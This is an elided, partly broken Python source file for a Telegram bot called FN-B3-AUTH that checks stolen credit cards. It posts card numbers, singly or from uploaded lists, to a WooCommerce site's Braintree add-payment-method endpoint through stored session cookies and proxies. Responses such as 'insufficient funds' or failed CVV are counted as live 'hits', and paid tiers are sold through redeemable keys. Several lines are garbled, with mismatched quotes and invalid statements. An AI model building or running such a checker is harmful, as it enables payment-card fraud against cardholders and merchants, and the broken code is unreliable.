...
# Cooldown configuration for bot requests
COOLDOWN_SECONDS = 10  # 10-second cooldown between bot requests
LAST_REQUEST_TIME = 0
REQUEST_LOCK = asyncio.Lock()

# Cooldown for payment method addition (20 seconds per user)
next_available_time = {}  # Tracks when each user can make the next request
user_locks = {}  # Per-user locks to prevent concurrent requests

# MongoDB setup with Motor (async) for users, keys, and progress (excluding cookies)
try:
...
async def load_cookies():
    """Load cookies from a local JSON file, with fallback to default cookies."""
    try:
        return await asyncio.to_thread(lambda: json.load(open("cookies.json", "r")))
    except FileNotFoundError:
        logger.warning("cookies.json not found, using default cookies")
        return {
        ...
        logger.error("Invalid JSON in cookies.json")
        return {}
    except Exception as e:
...
async def save_cookies():
    """Save the global SESSION_COOKIES to a local JSON file."""
    async with COOKIE_LOCK:
        try:
            await asyncio.to_thread(lambda: json.dump(SESSION_COOKIES, open("cookies.json", "w")))
            logger.info("Cookies saved to file successfully")
        except Exception as e:
...
async def update_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    async with COOKIE_LOCK:
        ...
        SESSION_COOKIES.update(new_cookies)
        logger.info("Calling save_cookies...")
        await save_cookies()
        logger.info("save_cookies completed")
    logger.info("COOKIE_LOCK released")
...
async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAULT_TYPE) -> dict:
    ...
    # Enforce bot-wide cooldown period
    async with REQUEST_LOCK:
        current_time = time.time()
        elapsed = current_time - LAST_REQUEST_TIME
        if elapsed < COOLDOWN_SECONDS:
            wait_time = COOLDOWN_SECONDS - elapsed
            logger.info(f"Waiting {wait_time:.2f} seconds for bot cooldown")
    ...
    try:
        ...
        async with aiohttp.ClientSession(
            ...
            # Enforce 20-second cooldown per user for payment method addition
            if user_id not in user_locks:
                user_locks[user_id] = asyncio.Lock()

            async with user_locks[user_id]:
                current_time = time.time()
                if user_id in next_available_time:
                    wait_until = next_available_time[user_id]
                    if current_time < wait_until:
                        wait_time = wait_until - current_time
                        logger.debug(f"Waiting {wait_time:.2f} seconds for user {user_id} payment method cooldown")
                        await asyncio.sleep(wait_time)
                ...
                async with COOKIE_LOCK:
                    ...
                    data = {
                        ...
                        "wc_braintree_credit-card_payment_nonce": token,
                    ...
                    async with session.post(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers, data=data) as response:
                        response_text = await response.text()
                        logger.info(f"Website response for card {cx[:6]}...{cx[-4:]}: {response_text[:500]}...")
                        ...
                        # Update the next available time after the request
                        next_available_time[user_id] = time.time() + 15
            ...
            if "new payment method added" in msg.lower() or "successfully" in msg.lower():
                status = "✅"
            elif "insufficient funds" in msg.lower():
                status = "✅"
            elif "duplicate card exists" in msg.lower():
                status = "✅"
            elif "cvv" in msg.lower() and "failed" in msg.lower():
                status = "✅"
            else:
                status = "❌"

            result = {
                "message": "✅" if status == "✅" else msg,
 ...
 Exception as e:
        logger.error(f"Error checking CC {cx[:6]}...{cx[-4:]}: {e}"")
...
async def checkout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if len(args) != 1 or not re.match(r"^\d{16}\|\d{2}\|\d{2,4}\|\d{3}$", args[0]):
        await update.message.reply_text("Invalid format. Use: /chk 4242424242424242|02|24|042")
    ...
    response = (
        f"{result['status']}\n\n"
        f"[ϟ] 𝗖𝗮𝗿𝗱𝗲: <code>{result['card_info']}</code>\n"
        ...
        f"[⌬] 𝐏𝗿𝗼𝘅𝗲: <code>{code_proxies_status_result['result']}</code>\n"
        f"[⌬] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {result['checked_by']} ({result['tier']})\n"
        f"[⌬] 𝗕𝗼𝘁: <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙩𝙃</a>"
    )
    await update.message.reply_text(response, parse_mode="HTML")
    logger.info("CC check completed")

# Task management for file checking
tasks class CheckerTask:
...
self.progress["results"].append(result)
        ...
        while not self.stopped and self.progress["checked"] < self.progress["total"]:
            try:
                ...
                keyboard = [
                    ...
                    [InlineKeyboardButton("𝗦𝘁𝗼𝗽 🔴", callback_data="stop")],
    ...
    async def finalize(self):
        total_time = time.time() - time.progress["start_time"]
        ...
        summary = (
            f"**[⌬] FN Checker Hits ** 😈⚡"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            f"[✅] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {self.progress['approved']}"
            f"[❌] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {self.progress['declined']}"
            f"[✅] 𝗖𝗖𝗡: {self.progress['ccn']}"
            f"[❌] 𝗗𝘂𝘁𝗽𝗹𝗶𝗰𝗮𝘁𝗲: {self.progress['duplicate']}"
            f"[🔍] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {self.progress['checked"]}/{self.progress['total']}"
            f"[∑] 𝗧𝗼𝘁𝗮𝗹: {self.progress['total']}"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            f"[⏱️] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {total_time:.2f} seconds"
            f"[⚡] 𝗔𝘃𝗴 𝗦𝗽𝗲𝗲𝗱: {avg_speed:.2f} cards/sec"
            f"[📈] 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗥𝗮𝘁𝗲: {success_rate:.2f}%"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ...
        # Send hits file
        hits = [r for r in self.progress["results"] if r["status"] in ["✅", "✅"]]
        if hits:
...
async def update_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if len(cards) > CHECKING_LIMITS[tier]:
        await update.message.reply_text(f"Checking your tier ({tier}) allows checking up to {CHECKING_LIMITS[tier]} cards.")
        cards = cards[:CHECKING_LIMITS[tier]]
        logger.info(f"Limited checking to {CHECKING_LIMITS[tier]} cards for tier {tier}")

    await update.message.reply_text(
        f"""✅ **File Received Successfully! Starting Check...**

⚡ **Progress Check**: Updates every 10 seconds"""
    )
    ...
    await task.start()
    del TASK_REGISTRY[user_id]  # Remove from tasks when done
...
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    for _ in range(quantity):
        ...
        keys.append(key)
    response = (
        f"🎁 **Gift Key Generated Successfully** 🎉\n\n"
        f"🔢 **Quantity**: {quantity}\n"
        f"📋 **Details**:\n" +
        "\n".join([f"🔑 `{key}`\n  └─ 💎 **Tier**: {tier} | ⏳ **Duration**: {duration} days" for key in keys]) +
        f"\n\n📌 **To Redeem**: Use `/redeem <key>`"
    )
    await update.message.reply_text(response, parse_mode="HTML")
    logger.info(f"Generated {len(keys)} keys for tier {tier}")
...
📅 **Expires On**: {expiration.strftime('%Y-%m-%d %H:%M:%S')} UTC

**Thank you for Using FN-B3-AUTH** 🚖🚖"""
    )
    logger.info(f"Key {key} redeemed successfully by user {user_id}")
    ...
    try:
        ...
        try:
            ...
            if result.deleted_count:
                await update.message.reply_text(f"Subscription deleted successfully for user {target_user_id}.")
        ...
        logger.error(f"Error deleting key for user {target_user_id}")
...
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # Stop task if exists
    if user_id in TASK_REGISTRY:
        task = await TASK_REGISTRY[user_id]
        await task.stop()
        await update.message.reply_text("❌ Checking stopped successfully.")
            return
...
async def post_init(application: Application):
    global SESSION_COOKIES
    try:
        # Initialize cookies from file
        SESSION_COOKIES = await load_cookies()
        logger.info("Cookies loaded successfully from file")
        
        # Schedule cookie refresh job
        application.job_queue.run_repeating(
            refresh_cookies,
            interval=COOKIE_REFRESH_INTERVAL,
            first=0
        )
        logger.info("Cookie refresh job scheduled successfully")
    except Exception as e:
        logger.error(f"Failed to initialize cookies: {e}")
        SESSION_COOKIES = await load_cookies.get_default()
...
def main():
    try:
        ...
        application.add_handler(MessageHandler(filters.DocumentType.ALL, lambda u, c: handle_proxies_file(u, c) if c.user_data.get("awaiting_proxies", False) else handle_file(u, c)))
